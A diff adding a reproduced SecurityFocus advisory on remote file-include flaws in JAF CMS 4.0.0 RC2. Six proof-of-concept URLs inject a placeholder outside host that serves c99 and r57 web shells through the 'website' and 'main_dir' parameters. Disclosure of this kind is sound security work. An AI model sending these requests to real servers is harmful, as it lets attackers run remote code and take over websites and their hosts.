@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/28476/info
+
+JAF CMS is prone to multiple remote file-include vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.
+
+JAF CMS 4.0.0 RC2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/forum.php?website=http://www.example2.com/c99.txt?
+http://www.example.com/forum.php?main_dir=http://www.example2.com/c99.txt?
+http://www.example.com/headlines.php?website=http://www.example2.com/erne.txt?
+http://www.example.com/headlines.php?main_dir=http://www.example2.com/r57.txt?
+http://www.example.com/main.php?website=http://www.example2.com/c99.txt?
+http://www.example.com/main.php?main_dir=http://www.example2.com/erne.txt? 
